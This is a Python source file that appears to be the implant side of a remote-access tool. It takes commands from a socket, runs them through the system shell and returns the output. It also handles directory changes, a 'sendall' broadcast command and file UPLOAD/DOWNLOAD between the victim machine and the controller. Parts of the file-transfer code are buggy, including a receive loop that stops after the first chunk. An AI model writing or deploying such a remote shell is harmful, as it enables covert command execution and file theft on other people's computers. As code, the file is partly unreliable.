import subprocess
import os
import time
from clear_output import clear_screen
FORMAT = 'UTF-8'

def run_command(client_socket,command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        client_socket.sendall( result.strip() .encode(FORMAT))
    except subprocess.CalledProcessError as e:
        client_socket.sendall( f"Error: {e.output.strip()}".encode(FORMAT))

def send_all_clients(client_socket,command):
    if command.startswith("UPLOAD"):
        download_file(client_socket,command)
    elif command.startswith("DOWNLOAD"):
        upload_file(client_socket,command)
    elif command.startswith("cd"):
     try:  
        command=command.split()
        if command[1]=="..":
            parent_directory = os.path.abspath('..')
            os.chdir(parent_directory)
        
        else:
          os.chdir(command[1])
        print(f"Current working directory: {os.getcwd()}")
     except FileNotFoundError as e:
      print("no such file or directory")
    else :
        try:
         result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
         print( result.strip() )
        except subprocess.CalledProcessError as e:
         print( f"Error: {e.output.strip()}")


def change_directory(client_socket,command:str): 
  try:  
    command=command.split()
    if command[1]=="..":
        parent_directory = os.path.abspath('..')
        os.chdir(parent_directory)
       
    else:
     os.chdir(command[1])
    print(f"Current working directory: {os.getcwd()}")
    client_socket.sendall( (os.getcwd()).encode(FORMAT))
  except FileNotFoundError as e:
      print("no such file or directory")  
      
      
      
      
def proccess(client_socket,command:str):
    if command.startswith("UPLOAD"):
        download_file(client_socket,command)
    elif command.startswith("DOWNLOAD"):
        upload_file(client_socket,command)
    elif command.startswith("cd"):
        change_directory(client_socket,command)
    elif command.startswith("sendall"):
     extracted_value = command.split("sendall", 1)[1].strip()  
     print(extracted_value)    
     send_all_clients(client_socket,extracted_value)
    else:
     run_command(client_socket,command)
     
def extract_components(input_string):
    # Split the input string by spaces
    parts = input_string.split()

    # Extract the command (DOWNLOAD)
    command = parts[0]

    # Extract the file path and filename
    file_path_with_filename = parts[1][1:]  # Remove angle bracket from the start
    filename_start = file_path_with_filename.rfind('/')+1 
    file_path = file_path_with_filename[:filename_start-2]
    filename = file_path_with_filename[filename_start:]

    # Extract the destination path
    destination_path = parts[2][1:-1]  # Remove angle bracket from the end

    return command, file_path, filename, destination_path



def upload_file(conn,input_string):
    _,file_path,file_name,_=extract_components(input_string)
    full_file_path=os.path.join(file_path,file_name)
    if os.path.exists(full_file_path):
        with open(full_file_path, 'rb') as file:
            while True:
        # Read a chunk of data from the file
              data = file.read(1024)
              if not data:

            # No more data to read from the file, break the loop
                break
        
        # Send the chunk of data to the client
              conn.sendall(data)
              print(data)
            print("the file send to the destination succesfully")
            conn.close()
            time.sleep(10)
            clear_screen()
            return "SUCCESS"
    else:
        conn.sendall(b'File not found')
        conn.close()
        return "UNSUCCESS"








def download_file(conn,input_string):
    _,_,file_name,destination_path=extract_components(input_string)
    if os.path.exists(destination_path):
        
        full_path_name=os.path.join(destination_path,file_name)
        with open(full_path_name, 'wb') as file:
    # Receive data in a loop until all data is received
          while True:
        # Receive up to 1024 bytes of data from the server
            data = conn.recv(1024)
            print(data)
            file=file.write(data)
        # If no more data is received, break the loop
            if   len(data):
              break
        
        # Write the received data to the file
        
          print("File received and saved successfully.")
        
          conn.close()
          
    else :print("this destination path isn't exit")